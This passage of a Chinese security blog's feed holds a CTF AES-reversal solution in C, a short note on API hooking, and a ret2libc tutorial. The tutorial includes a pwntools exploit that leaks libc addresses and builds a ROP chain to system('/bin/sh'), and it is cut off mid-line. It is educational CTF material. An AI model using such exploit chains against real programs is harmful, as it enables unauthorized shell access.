class="line"><span class="comment">//state[5] = state[13];</span></span><br><span class="line"><span class="comment">//state[13] = tempb;</span></span><br><span class="line"></span><br><span class="line">tempb = state[<span class="number">13</span>];</span><br><span class="line">state[<span class="number">13</span>] = state[<span class="number">5</span>];</span><br><span class="line">state[<span class="number">5</span>] = tempb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tempc = state[2];</span></span><br><span class="line"><span class="comment">//state[2] = state[6];</span></span><br><span class="line"><span class="comment">//state[6] = state[10];</span></span><br><span class="line"><span class="comment">//state[10] = state[14];</span></span><br><span class="line"><span class="comment">//state[14] = tempc;</span></span><br><span class="line"></span><br><span class="line">tempc = state[<span class="number">14</span>];</span><br><span class="line">state[<span class="number">14</span>] = state[<span class="number">10</span>];</span><br><span class="line">state[<span class="number">10</span>] = state[<span class="number">6</span>];</span><br><span class="line">state[<span class="number">6</span>] = state[<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>] = tempc;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint8_t</span> __cdecl <span class="title">mul2</span><span class="params">(<span class="type">uint8_t</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((a &amp; <span class="number">0x80</span>u) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * a;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">return</span> (<span class="number">2</span> * a) ^ <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">aes_encrypt_128</span><span class="params">(BYTE* roundkeys, BYTE* m, BYTE* c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* mid; <span class="comment">// rax</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* v4; <span class="comment">// rax</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* v5; <span class="comment">// rax</span></span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">uint8_t</span> t; <span class="comment">// [rsp+3Dh] [rbp-3h]</span></span><br><span class="line"><span class="type">uint8_t</span> j; <span class="comment">// [rsp+3Eh] [rbp-2h]</span></span><br><span class="line"><span class="type">uint8_t</span> i; <span class="comment">// [rsp+3Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">mid = roundkeys++;</span><br><span class="line">c[i] = *mid ^ m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= <span class="number">9u</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">tmp[i] = INV_SBOX[c[i]];</span><br><span class="line"><span class="built_in">shift_rows</span>(tmp);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">t = tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">1</span>] ^ tmp[i] ^ tmp[i + <span class="number">3</span>];</span><br><span class="line">c[i] = t ^ tmp[i] ^ <span class="built_in">mul2</span>(tmp[i] ^ tmp[i + <span class="number">1</span>]);</span><br><span class="line">c[i + <span class="number">1</span>] = t ^ tmp[i + <span class="number">1</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">1</span>] ^ tmp[i + <span class="number">2</span>]);</span><br><span class="line">c[i + <span class="number">2</span>] = t ^ tmp[i + <span class="number">2</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">3</span>]);</span><br><span class="line">c[i + <span class="number">3</span>] = t ^ tmp[i + <span class="number">3</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">3</span>] ^ tmp[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v4 = roundkeys++;</span><br><span class="line">c[i] ^= *v4;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">c[i] = INV_SBOX[c[i]];</span><br><span class="line"><span class="built_in">shift_rows</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v5 = roundkeys++;</span><br><span class="line">c[i] ^= *v5;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cToTmp</span><span class="params">(<span class="type">uint8_t</span>* tmp, <span class="type">uint8_t</span>* c)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint8_t</span> t = c[i + <span class="number">2</span>] ^ c[i + <span class="number">1</span>] ^ c[i] ^ c[i + <span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t0 = <span class="number">0</span>; t0 &lt;= <span class="number">256</span>; t0++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t1 = <span class="number">0</span>; t1 &lt;= <span class="number">256</span>; t1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i] == (t ^ t0 ^ <span class="built_in">mul2</span>(t0 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t2 = <span class="number">0</span>; t2 &lt;= <span class="number">256</span>; t2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">1</span>] == (t ^ t1 ^ <span class="built_in">mul2</span>(t2 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t3 = <span class="number">0</span>; t3 &lt;= <span class="number">256</span>; t3++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">2</span>] == (t ^ t2 ^ <span class="built_in">mul2</span>(t2 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">3</span>] == (t ^ t3 ^ <span class="built_in">mul2</span>(t0 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line">tmp[i] = t0;</span><br><span class="line">tmp[i + <span class="number">1</span>] = t1;</span><br><span class="line">tmp[i + <span class="number">2</span>] = t2;</span><br><span class="line">tmp[i + <span class="number">3</span>] = t3;</span><br><span class="line"><span class="comment">//printf(&quot;%x %x %x %x\n&quot;, tmp[i], tmp[i + 1], tmp[i + 2], tmp[i + 3]);</span></span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">next:;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_decrypt_128</span><span class="params">(BYTE* roundkeys, BYTE* c, BYTE* m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">BYTE* u = <span class="number">0</span>;</span><br><span class="line">roundkeys = &amp;roundkeys[<span class="number">175</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] = *u ^ c[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">9</span>; j &gt;= <span class="number">1</span>; --j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">inv_shiftrows</span>(m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>; ++i)</span><br><span class="line">m[i] = SBOX[m[i]];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] ^= *u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cToTmp</span>(tmp, m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">m[i] = tmp[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">inv_shiftrows</span>(m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>; ++i)</span><br><span class="line">m[i] = SBOX[m[i]];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] ^= *u;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">encMain</span><span class="params">(BYTE* roundKey, BYTE* m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//auto part1 = reinterpret_cast&lt;BYTE*&gt;(const_cast&lt;char*&gt;(m.substr(0, m.length() / 2).c_str()));</span></span><br><span class="line"><span class="comment">//auto part2 = reinterpret_cast&lt;BYTE*&gt;(const_cast&lt;char*&gt;(m.substr(m.length() / 2).c_str()));</span></span><br><span class="line"><span class="comment">/*BYTE* part1 = const_cast&lt;BYTE*&gt;(m.data());*/</span></span><br><span class="line"></span><br><span class="line">BYTE c[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">aes_encrypt_128</span>(roundKey, m, c);</span><br><span class="line"><span class="built_in">aes_encrypt_128</span>(roundKey, m + <span class="number">16</span>, &amp;c[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decMain</span><span class="params">(BYTE* roundKey, BYTE* c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE m[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">aes_decrypt_128</span>(roundKey, c, m);</span><br><span class="line"><span class="built_in">aes_decrypt_128</span>(roundKey, &amp;c[<span class="number">16</span>], m + <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, m[i]);</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE m[] = <span class="string">&quot;11111111111111111111111111111111\0&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rkey[<span class="number">179</span>] = &#123;</span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x21</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x98</span>, <span class="number">0x91</span>, <span class="number">0xF1</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x9A</span>, <span class="number">0xAB</span>, <span class="number">0xCD</span>, <span class="number">0x0A</span>, <span class="number">0xFC</span>, <span class="number">0x8A</span>, <span class="number">0xEC</span>,</span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xE6</span>, <span class="number">0x5F</span>, <span class="number">0x96</span>, <span class="number">0xDD</span>, <span class="number">0x13</span>, <span class="number">0xAB</span>, <span class="number">0x38</span>, <span class="number">0xA3</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xA9</span>, <span class="number">0x75</span>, <span class="number">0x8A</span>, <span class="number">0x19</span>,</span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x98</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x93</span>, <span class="number">0x8B</span>, <span class="number">0x20</span>, <span class="number">0x7D</span>, <span class="number">0x30</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0x77</span>, <span class="number">0xAA</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB3</span>, <span class="number">0x34</span>, <span class="number">0x0A</span>, <span class="number">0xAB</span>, <span class="number">0x20</span>, <span class="number">0xBF</span>, <span class="number">0x2A</span>, <span class="number">0xD6</span>, <span class="number">0x10</span>, <span class="number">0xBD</span>, <span class="number">0x0A</span>, <span class="number">0x5E</span>, <span class="number">0x89</span>, <span class="number">0xCA</span>, <span class="number">0xA0</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xD4</span>, <span class="number">0x80</span>, <span class="number">0x0C</span>, <span class="number">0xF7</span>, <span class="number">0x6B</span>, <span class="number">0xAA</span>, <span class="number">0xDA</span>, <span class="number">0xE7</span>, <span class="number">0xD6</span>, <span class="number">0xA0</span>, <span class="number">0x84</span>, <span class="number">0x6E</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0x4B</span>,</span><br><span class="line"><span class="number">0x6B</span>, <span class="number">0xB7</span>, <span class="number">0x33</span>, <span class="number">0x93</span>, <span class="number">0x9C</span>, <span class="number">0xDC</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0x7B</span>, <span class="number">0x0A</span>, <span class="number">0x39</span>, <span class="number">0xCD</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x39</span>, <span class="number">0x86</span>,</span><br><span class="line"><span class="number">0x6C</span>, <span class="number">0xA5</span>, <span class="number">0x77</span>, <span class="number">0xCA</span>, <span class="number">0xF0</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x83</span>, <span class="number">0x8B</span>, <span class="number">0x73</span>, <span class="number">0xD7</span>, <span class="number">0x4E</span>, <span class="number">0x9E</span>, <span class="number">0x65</span>, <span class="number">0xEE</span>, <span class="number">0xC8</span>,</span><br><span class="line"><span class="number">0xA1</span>, <span class="number">0x8D</span>, <span class="number">0x9F</span>, <span class="number">0xC1</span>, <span class="number">0x51</span>, <span class="number">0xF4</span>, <span class="number">0x71</span>, <span class="number">0x42</span>, <span class="number">0xDA</span>, <span class="number">0x87</span>, <span class="number">0xA6</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0xE2</span>, <span class="number">0x48</span>, <span class="number">0xC4</span>,</span><br><span class="line"><span class="number">0x22</span>, <span class="number">0xDF</span>, <span class="number">0x83</span>, <span class="number">0xDA</span>, <span class="number">0x73</span>, <span class="number">0x2B</span>, <span class="number">0xF2</span>, <span class="number">0x98</span>, <span class="number">0xA9</span>, <span class="number">0xAC</span>, <span class="number">0x54</span>, <span class="number">0x94</span>, <span class="number">0xED</span>, <span class="number">0x4E</span>, <span class="number">0x1C</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x3B</span>, <span class="number">0x43</span>, <span class="number">0xD0</span>, <span class="number">0x8F</span>, <span class="number">0x48</span>, <span class="number">0x68</span>, <span class="number">0x22</span>, <span class="number">0x17</span>, <span class="number">0xE1</span>, <span class="number">0xC4</span>, <span class="number">0x76</span>, <span class="number">0x83</span>, <span class="number">0x0C</span>, <span class="number">0x8A</span>, <span class="number">0x6A</span>, <span class="number">0xD3</span>,</span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x15</span>, <span class="number">0x40</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//encMain(rkey, m);</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> c[<span class="number">8</span>] = &#123;</span><br><span class="line"><span class="number">0x768E076C</span>, <span class="number">0x8A2F31A6</span>, <span class="number">0xE452B98D</span>, <span class="number">0xAA000D64</span>, <span class="number">0x48802D4B</span>, <span class="number">0xEC290C73</span>, <span class="number">0x17F0FFC3</span>, <span class="number">0x2785A657</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decMain</span>(rkey, <span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(c));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">在这个题上被卡了一下</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    <category term="CTF" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/"/>
    
    <category term="比赛" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/%E6%AF%94%E8%B5%9B/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="爆破" scheme="https://www.pri87.vip/tags/%E7%88%86%E7%A0%B4/"/>
    
    <category term="AES" scheme="https://www.pri87.vip/tags/AES/"/>
    
  </entry>
  
  <entry>
    <title>《逆核》0A-API勾取</title>
    <link href="https://www.pri87.vip/posts/6dc52a20.html"/>
    <id>https://www.pri87.vip/posts/6dc52a20.html</id>
    <published>2025-01-10T15:32:25.000Z</published>
    <updated>2025-01-12T11:59:37.730Z</updated>
    
    <content type="html"><![CDATA[<h2 id="API勾取">API勾取</h2><p>实际上就是对程序使用的系统API进行Hook</p><p><img src="https://s2.loli.net/2025/01/10/YvLw8UG9QMeoKry.png" alt="image-20250110233657957"></p><p>可以修改IAT/EAT/代码，对于直接hook代码，和之前的inlineHook一样<br>对于IAT，是程序执行对应API代码时，IAT会存放对应函数偏移，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp cs:offset</span><br><span class="line">......</span><br><span class="line">offset 真实偏移</span><br></pre></td></tr></table></figure><p>可以直接修改这里的真实偏移，然后跳转到自己的代码中，最后跳转到真实偏移地址。</p><p>本质上还是Hook，但是要注意参数的传递，具体可以看之前的调用约定那一篇或者具体调试分析。</p><h2 id="实践">实践</h2><p>详见下面这个项目：</p><p><a href="https://github.com/43287/AntiAntiDebug_plugin_for_IDA8.3">43287/AntiAntiDebug_plugin_for_IDA8.3: 一个只支持x64的IDA反调试插件</a></p><p>其中使用了IAThook和InlineHook</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;API勾取&quot;&gt;API勾取&lt;/h2&gt;
&lt;p&gt;实际上就是对程序使用的系统API进行Hook&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2025/01/10/YvLw8UG9QMeoKry.png&quot; alt=&quot;image-20250110</summary>
      
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="Hook" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/Hook/"/>
    
    
    <category term="win" scheme="https://www.pri87.vip/tags/win/"/>
    
  </entry>
  
  <entry>
    <title>ret2libc与栈迁移</title>
    <link href="https://www.pri87.vip/posts/26c65c86.html"/>
    <id>https://www.pri87.vip/posts/26c65c86.html</id>
    <published>2025-01-04T08:59:23.000Z</published>
    <updated>2025-01-04T09:06:09.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RET2libc">RET2libc</h3><p>一般情况下，一个程序不会有system(“bin/sh”)这种危险代码让我们直接getshell。</p><p>ret2libc是一种方法，让我们取得外部动态链接库(so)的基地址，并通过基地址加偏移的方式获得目标库函数的地址，从而在程序没有主动调用目标函数时修改ret地址返回到我们想要的库函数地址。</p><p>练习题：</p><p>打开先checksec</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><p>有部分RELRO和NX保护</p><p>vuln函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行了一次输出，一次输入，输入长度为112，很明显可以覆盖地址</p><p>程序没有bin/sh字符串和system地址，所以只能自己泄漏出来</p><p>got表会先按执行顺序生成地址，所以先进入main后一定会先生成__libc_start_main函数。通过这个得到libc基地址然后加对应偏移得到system和bin/sh地址，最后构造rop链去执行函数</p><p>顺序：</p><p>vuln–&gt;puts–&gt;system</p><p>现在还有一个问题，我们控制的地址只是栈，但是puts函数的传参却在寄存器里面，该如何把栈中的值放到寄存器里呢，很明显，pop指令</p><p>可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011E8     ; __unwind &#123;</span><br><span class="line">.text:00000000004011E8 000                 endbr64</span><br><span class="line">.text:00000000004011EC 000                 push    rbp</span><br><span class="line">.text:00000000004011ED 008                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011F0 008                 sub     rsp, 70h</span><br><span class="line">.text:00000000004011F4 078                 lea     rax, s          ; &quot;RET2LIBC &gt;_&lt;&quot;</span><br><span class="line">.text:00000000004011FB 078                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000004011FE 078                 call    _puts</span><br><span class="line">.text:0000000000401203 078                 lea     rax, [rbp+var_70]</span><br><span class="line">.text:0000000000401207 078                 mov     rdi, rax</span><br><span class="line">.text:000000000040120A 078                 mov     eax, 0</span><br><span class="line">.text:000000000040120F 078                 call    _gets</span><br><span class="line">.text:0000000000401214 078                 nop</span><br><span class="line">.text:0000000000401215 078                 leave</span><br><span class="line">.text:0000000000401216 000                 retn</span><br><span class="line">.text:0000000000401216     ; &#125; // starts at 4011E8</span><br><span class="line">.text:0000000000401216     vuln            endp</span><br></pre></td></tr></table></figure><p>这里传给puts的值是rdi</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure><p>用gadget看看，发现0x00000000004011e3 : pop rdi ; ret<br>如果先返回这个地址，就可以把写入栈的泄露地址给rdi，然后执行后面的操作</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e = ELF(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">payload1 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x00000000004011e3</span>)+p64(libc_start_main_got)+p64(<span class="number">0x401060</span>)+p64(<span class="number">0x401090</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span> +p64(<span class="number">0x000000000040101a</span>)+p64(<span class="number">0x00000000004011e3</span>)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recvuntil(<span 